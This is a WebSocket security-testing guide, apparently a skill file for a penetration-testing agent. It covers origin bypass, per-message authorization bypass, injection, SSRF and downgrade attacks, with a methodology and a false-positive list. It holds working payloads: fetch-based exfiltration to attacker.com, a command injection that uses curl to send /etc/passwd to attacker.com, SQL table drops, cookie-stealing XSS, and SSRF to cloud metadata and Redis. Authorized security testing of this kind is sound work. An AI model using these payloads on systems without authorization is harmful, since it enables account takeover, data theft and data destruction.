---
name: websocket_security
description: WebSocket security testing for cross-site hijacking, message injection, auth bypass, SSRF via upgrade, and downgrade attacks
---

# WebSocket Security

WebSocket connections establish persistent bidirectional channels between client and server. The upgrade handshake, message framing, and per-message authorization each present distinct attack surfaces. Missing origin checks, insufficient per-message auth, and server-side message processing bugs are common and impactful.

## Attack Surface

**Scope**
- WebSocket upgrade endpoints (`ws://` and `wss://`, HTTP Upgrade with `Sec-WebSocket-Key`)
- Real-time features: chat, notifications, live dashboards, collaborative editing, multiplayer
- Server-side message handlers parsing JSON, XML, or binary frames
- Proxy/load balancer WebSocket forwarding behavior
- Sub-protocol negotiation (`Sec-WebSocket-Protocol`)

**Discovery**
- Search JS for `new WebSocket(`, `wss://`, `ws://`, socket.io, SignalR
- Check for `/socket.io/?EIO=4&transport=websocket`, `/_hubs/`, `/ws`, `/websocket`
- Inspect HTTP responses for `101 Switching Protocols` and `Upgrade: websocket` headers
- Review `Sec-WebSocket-Protocol` for auth tokens in sub-protocol negotiation

## High-Value Targets

### Cross-Site WebSocket Hijacking (CSWSH)

**Origin validation bypass**
```
# If server doesn't validate Origin header, connect from attacker page:
const ws = new WebSocket('wss://target.com/ws');
ws.onmessage = (e) => {
  fetch('https://attacker.com/exfil?data=' + encodeURIComponent(e.data));
};
# Browser sends cookies automatically on WebSocket upgrade
```

**Null origin**
```
# From sandboxed iframe (sandbox attribute without allow-same-origin):
<iframe sandbox="allow-scripts" srcdoc="<script>
const ws = new WebSocket('wss://target.com/ws');
ws.onmessage = e => fetch('https://attacker.com/?d='+e.data);
</script>">
# Origin: null — accepted by servers checking for specific origins only
```

**Subdomain/origin variations**
```
# If server checks Origin contains "target.com":
# attacker-target.com, target.com.attacker.com, target-com.attacker.com
# Test with curl: curl -H "Origin: https://evil.com" -H "Connection: Upgrade" -H "Upgrade: websocket" ...
```

### Auth Bypass Per-Message

**Missing per-message authorization**
```
# Server authenticates on WS upgrade (via cookie/token) but doesn't verify
# authorization on each message. Connect as low-priv user, send admin commands:
ws.send('{"action":"admin","method":"deleteUser","id":123}')

# If server trusts user ID from first message:
ws.send('{"userId":"admin","type":"subscribe","channel":"admin-internal"}')
```

**Token in sub-protocol**
```
# Some apps pass auth token in Sec-WebSocket-Protocol header
# Server may log or forward this without validation
# Test: connect without token, or with another user's token
const ws = new WebSocket('wss://target.com/ws', ['auth-token-eyJhbG...']);
```

### Message Injection

**JSON injection in WebSocket messages**
```
# If server concatenates user input into JSON responses to other users:
ws.send('{"chat":"hello\\"},\\"admin\\":true,\\"x\\":\\""}')

# Stored XSS via WebSocket chat
ws.send('{"message":"<img src=x onerror=alert(document.cookie)>"}')
```

**Command injection in server-side processing**
```
# If server passes message content to shell/system commands
ws.send('{"filename":"test; curl attacker.com/$(cat /etc/passwd)"}')
ws.send('{"query":"1; DROP TABLE users; --"}')
```

### WebSocket SSRF

**Server as HTTP proxy via WebSocket**
```
# If server fetches URLs based on WebSocket messages:
ws.send('{"url":"http://169.254.169.254/latest/meta-data/"}')
ws.send('{"url":"http://localhost:6379/INFO"}')
ws.send('{"url":"gopher://localhost:6379/_SET%20pwned%20true"}')

# Some WebSocket servers allow specifying full request details:
ws.send('{"method":"GET","url":"http://internal-api/admin","headers":{"Authorization":"Bearer admin-token"}}')
```

### Downgrade Attacks

**Protocol downgrade**
```
# Force client to use ws:// instead of wss:// via MITM
# Remove/modify Upgrade headers to fall back to long-polling
# Inject response to upgrade: 101 → 200 with connection: close

# Mixed-content WebSocket blocking: browsers block ws:// from https:// pages
# But attacker-controlled http:// page can use ws:// to connect to wss:// targets
```

## Bypass Techniques

**Origin Bypass**
```
# Null origin (sandboxed iframe)
# Regex bypass: target.com.evil.com, eviltarget.com
# Unicode normalization: target\u002ecom, target%2ecom
# Missing Origin header: some servers only block wrong origins, not missing ones
# Use curl/Python to omit Origin entirely during upgrade handshake
```

**Message Format Bypass**
```
# If server parses JSON but enforces schema loosely:
ws.send('{"type":"message","content":"test","role":"admin"}')

# Binary frames instead of text frames (server may not validate binary)
buffer = new TextEncoder().encode('{"admin":true}')
ws.send(buffer)

# Multiple JSON objects in one message
ws.send('{"type":"chat","msg":"hi"}{"type":"admin","action":"escalate"}')
```

**Authentication Bypass**
```
# Test connecting without any auth (no cookies, no tokens)
# Test with expired/revoked tokens
# Test with another user's session token
# Test reusing WebSocket auth token across different endpoints
# Test session fixation: inject token via URL param if WS handshake reads from query string
```

## Testing Methodology

1. **Discover WebSocket endpoints** — Search JS source, intercept upgrade requests, check for `ws://`/`wss://` URLs, test common paths (`/ws`, `/socket`, `/socket.io/`)
2. **Test origin validation** — Connect with no Origin, null Origin, attacker Origin, subdomain variations. Use `curl -H "Origin: https://evil.com" -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" https://target/ws`
3. **Enumerate message types** — Connect and send various JSON structures, observe server responses and errors. Map available actions, methods, channels, subscriptions
4. **Test per-message auth** — Connect as user A, send user B's commands. Send admin actions as regular user. Modify userId/role fields in messages
5. **Test SSRF** — Send messages containing internal URLs, metadata endpoints, or protocol handlers
6. **Test injection** — Inject XSS payloads in messages (test reflected back to other users), SQL/command injection in server-side processing
7. **Test binary frames** — Send binary WebSocket frames with same payloads; servers may have different parsing paths
8. **Test reconnection/token handling** — Observe how auth tokens are passed, refreshed, and validated on reconnection

## Validation

1. Demonstrate CSWSH: show a proof-of-concept page that connects and exfiltrates data
2. Show auth bypass: perform admin actions via WebSocket as unprivileged user
3. Confirm SSRF: WebSocket message triggers server to fetch internal resource (prove with OAST or response data)
4. Demonstrate injection: XSS payload rendered in another client's context, or command output returned
5. Document the upgrade request, auth mechanism, message format, and vulnerability chain

## False Positives

- Echo servers or test endpoints with no sensitive data or actions
- WebSocket servers with proper per-message authorization checks
- Origin-validated servers rejecting all cross-origin connections (including null)
- Public broadcast channels (e.g., stock tickers) with no user-specific data
- Servers that only accept messages in a strict schema and reject unexpected fields

## Impact

- Account takeover via CSWSH (session cookies sent on upgrade)
- Privilege escalation via missing per-message authorization
- SSRF to internal services and cloud metadata
- Data exfiltration from real-time channels (chat, notifications, dashboards)
- Stored XSS in multi-user WebSocket applications
- Message forgery in collaborative/multiplayer applications

## Pro Tips

1. Always test with and without Origin header — many servers only check for specific wrong origins but allow missing Origin
2. Use Burp Suite's WebSocket tab or `wscat -c wss://target/ws` for manual message fuzzing
3. Check if the server broadcasts messages to all connected clients — stored XSS impact is much higher
4. For socket.io/SignalR: test the polling fallback transport separately; it may have different auth
5. Binary WebSocket frames often bypass text-based input validation — always test binary payloads
6. Monitor for user IDs, session tokens, or internal data in WebSocket messages from other users
7. Test connection limits and rate limiting — DoS via connection exhaustion is common
8. Check if WebSocket messages trigger server-side HTTP requests (SSRF) — this is the highest-impact finding in most WebSocket assessments
